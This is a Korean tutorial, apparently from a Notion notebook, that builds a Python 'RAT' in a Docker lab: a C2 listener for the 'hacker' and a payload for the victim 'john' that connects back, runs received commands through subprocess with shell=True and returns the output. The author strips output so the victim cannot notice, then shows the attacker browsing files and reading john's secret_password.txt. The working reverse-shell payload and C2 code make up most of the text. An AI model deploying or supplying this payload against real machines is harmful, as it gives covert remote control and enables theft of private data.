# Quokka RAT : subprocess 리버스 쉘 만들기

<aside>
⚠️ author : 전재호(agamtt) 2024-03-17

</aside>

<aside>
💡 **사전지식필요
[소켓, 포트, IP, 인바운드, 아웃바운드, 방화벽, 포트포워딩](%E1%84%89%E1%85%A9%E1%84%8F%E1%85%A6%E1%86%BA,%20%E1%84%91%E1%85%A9%E1%84%90%E1%85%B3,%20IP,%20%E1%84%8B%E1%85%B5%E1%86%AB%E1%84%87%E1%85%A1%E1%84%8B%E1%85%AE%E1%86%AB%E1%84%83%E1%85%B3,%20%E1%84%8B%E1%85%A1%E1%84%8B%E1%85%AE%E1%86%BA%E1%84%87%E1%85%A1%E1%84%8B%E1%85%AE%E1%86%AB%E1%84%83%E1%85%B3,%20%E1%84%87%E1%85%A1%E1%86%BC%E1%84%92%E1%85%AA%E1%84%87%E1%85%A7%202a056421d2234dd9aaf23db548b99102.md)**

[Socket / IP / Port / network](Socket%20IP%20Port%20network%20e18b03543f5e46999042b2a19b383d55.md)

[약속된 IP 주소](%E1%84%8B%E1%85%A3%E1%86%A8%E1%84%89%E1%85%A9%E1%86%A8%E1%84%83%E1%85%AC%E1%86%AB%20IP%20%E1%84%8C%E1%85%AE%E1%84%89%E1%85%A9%209c5773c54bb9422d8297f7dc98d2e2df.md)

[컨테이너 두개로 python socket 실습](%E1%84%8F%E1%85%A5%E1%86%AB%E1%84%90%E1%85%A6%E1%84%8B%E1%85%B5%E1%84%82%E1%85%A5%20%E1%84%83%E1%85%AE%E1%84%80%E1%85%A2%E1%84%85%E1%85%A9%20python%20socket%20%E1%84%89%E1%85%B5%E1%86%AF%E1%84%89%E1%85%B3%E1%86%B8%204dfcf68e338d434fbbcb9d9ebaee562d.md)

위 문서를 숙지해야 이해할 수 있습니다.

</aside>

우선 hacker 의 ip주소를 조사해봅시다.

- ifconfig 명령어를 사용하면 ip 주소를 알 수 있습니다.
- net-tools 를 설치하면 ifconfig 를 사용할 수 있습니다.

```bash
# hacker 의 컴퓨터에서,
sudo apt update && sudo apt install -y net-tools
```

이제 ifconfig 를 실행해서 ip주소를 알아냅니다.

- lo 는 local 의 약자로, 그냥 자기 자신을 의미하니, 이건 아닙니다.
- eth0 는 인터페이스명이고, inet 뒤에 있는 것이 자신의 ip 주소입니다.

![Untitled](Untitled%20586.png)

C2서버의 ip 주소가 172.17.0.3 임을 알았습니다.

(본인의 컴퓨터에서는 다를 수도 있습니다. 도커 컨테이너의 IP 주소는 도커 컨테이너가 생성될 때, 사용중이지 않은 IP 주소가 아무거나 지정됩니다.)

hacker 의 컨테이너에 listener.py 라는 파일을 만들고 아래와 같이 코딩합니다.

- 모든 IP 에서 연결요청이 들어오는 것을 허용하기 위해, 0.0.0.0 을 입력합니다.
    - 참고 :
- 해커의 C2 서버 컨테이너를 생성할 때, 포트포워딩한 포트 중 도커의 포트를 입력합니다.
    - 호스트포트:도커포트 형식입니다.
    - 외부에서 내 컴퓨터(호스트)의 포트를 거쳐서 도커 컨테이너로 연결되는 것이 아니고, 내 컴퓨터 내부에 있는 컨테이너에서 접속하는 것이라서 입니다.

![Untitled](Untitled%20587.png)

```python
import socket

host = '0.0.0.0'
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host,port))

s.listen(1)
print(f"Listening for incoming connections on {host}:{port}...")
conn, addr = s.accept()
print(f"Connection established with {addr}")

while True:
    command = input("Enter Message: ")
    conn.send(command.encode())
    output = conn.recv(1024).decode()
    print(f'도착 : {output}')

   
 # 연결 닫기
conn.close()
```

피해자 john 의 컴퓨터에 client.py 파일을 만들고, 아래와 같이 코딩합니다.

```python
import socket

host = "172.17.0.3"
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    message = s.recv(1024).decode()
    print(f"상대부터 온 메시지 : {message}")

    data = input("당신의 메지를 입력하세요: ")

    s.send(data.encode())ㅅㅅㄷ
```

이제 서버(해커)의 코드를 먼저 실행하고, (listen 하고 있는 상태에서) 클라이언트(john)로 접속합니다.

![Untitled](Untitled%20588.png)

그러면 연결이 수립됨을 확인할 수 있습니다.

![Untitled](Untitled%20589.png)

![Untitled](Untitled%20590.png)

즉, 아래와 같은 두가지의 사실을 알 수 있습니다.

- 서버는 포트를 열면 된다.
- 클라이언트는 서버의 IP와 열린포트번호를 알면 된다.

![Untitled](Untitled%20591.png)

<aside>
💡 연결을 종료하려면 Ctrl + C 를 누르면 됩니다.

</aside>

# subprocess 와 socket 을 연결하기

이제 이 통신 프로그램에 subprocess 로 명령어를 실행하게 하고, 희생자 john 의 컴퓨터에는 아무것도 표시되지 않도록 print() 를 전부 제거합시다. (안그러면 악성코드가 실행되고 있는지 john 이 알게 되니까요)

hacker 의 서버에 이제 c2_listener.py 를 만들고 아래와 같이 코딩합니다.

```python
import socket

host = '0.0.0.0'
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host,port))

s.listen(1)
print(f"Listening for incoming connections on {host}:{port}...")
conn, addr = s.accept()
print(f"Connection established with {addr}")

while True:
    command = input("Enter Command: ")
    conn.send(command.encode())
    output = conn.recv(1024).decode()
    print(f'recv : {output}')

   
 # 연결 닫기
conn.close()
```

john 의 컴퓨터에는 payload.py 를 만들고 아래와 같이 코딩합니다.

```python
import socket
import subprocess

host = "172.17.0.3"
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
    result = output.stdout
    if(result==''):
        s.send("success".encode())
    else:
        s.send(result.encode())
```

이제 listener 를 실행한 후, payload 를 실행하면,

![Untitled](Untitled%20592.png)

hacker 는 john 의 컴퓨터의 쉘을 얻습니다.

- john 은 hacker 가 접속한 상태인지 전혀 알지 못합니다.
- hacker 는 원하는 쉘커맨드를 john 의 컴퓨터에서 마음대로 실행할 수 있습니다.
- john 은 포트를 연적이 없고, ip 주소를 hacker 에게 알려준 적이 없습니다.

<aside>
💡 **참고 : subprocess 에서는 cd 명령어를 사용할 수 없습니다.**
subprocess() 함수는 명령어를 실행할 때마다 새로운 터미널을 엽니다. cd 로 디렉토리를 바꾸면, 다시 명령어를 실행할 때에는 다시 원래 디렉토리로 돌아오게 됩니다.

****(아래 참고)

[How to run the cd command in the terminal through Python script?](https://forum.freecodecamp.org/t/how-to-run-the-cd-command-in-the-terminal-through-python-script/511634)

따라서 ls {경로} 를 입력해서 해당 디렉토리의  알아내는 방식으로 사용해야합니다.

</aside>

john 의 컴퓨터가 해킹되었는지 알 수 있게 하기 위해, john 의 컴퓨터의 원하는 위치에 secret_password.txt 라는 파일을 만들었습니다. 이 파일은 john 컴퓨터에 저장되어, john 만 볼 수 있습니다. 

- hacker 는 john 컴퓨터 앞에 있지도 않고, adduser 당시 생성한 비밀번호도 모릅니다.

![Untitled](Untitled%20582.png)

ls 명령어를 이용해서 john 의 컴퓨터를 마음대로 뒤질 수 있습니다.

![Untitled](Untitled%20593.png)

secret_password.txt 라는 누가봐도 훔치기 좋은 파일을 발견한 해커는

cat 명령어를 이용해, secret_password.txt 를 읽습니다.

![Untitled](Untitled%20594.png)

리버스쉘을 이용하여 해킹을 성공했습니다.

참고:

[터미널, 쉘, 쉘 커맨드](%E1%84%90%E1%85%A5%E1%84%86%E1%85%B5%E1%84%82%E1%85%A5%E1%86%AF,%20%E1%84%89%E1%85%B0%E1%86%AF,%20%E1%84%89%E1%85%B0%E1%86%AF%20%E1%84%8F%E1%85%A5%E1%84%86%E1%85%A2%E1%86%AB%E1%84%83%E1%85%B3%20fbc48e2acece4f7c85babccd3f0a9546.md)

[개념 : 리눅스의 디렉토리 구조](%E1%84%80%E1%85%A2%E1%84%82%E1%85%A7%E1%86%B7%20%E1%84%85%E1%85%B5%E1%84%82%E1%85%AE%E1%86%A8%E1%84%89%E1%85%B3%E1%84%8B%E1%85%B4%20%E1%84%83%E1%85%B5%E1%84%85%E1%85%A6%E1%86%A8%E1%84%90%E1%85%A9%E1%84%85%E1%85%B5%20%E1%84%80%E1%85%AE%E1%84%8C%E1%85%A9%202dd6c200fe3046a7998c3a9415fc89ed.md)

[파일 탐색 : ls, cd, clear](%E1%84%91%E1%85%A1%E1%84%8B%E1%85%B5%E1%86%AF%20%E1%84%90%E1%85%A1%E1%86%B7%E1%84%89%E1%85%A2%E1%86%A8%20ls,%20cd,%20clear%204578559f2a884667acf3141c5d2eee0d.md)

[mkdir / cat / rm](mkdir%20cat%20rm%20bdb20bd643a84c4dbf72e61fdfc3ebd9.md)

계속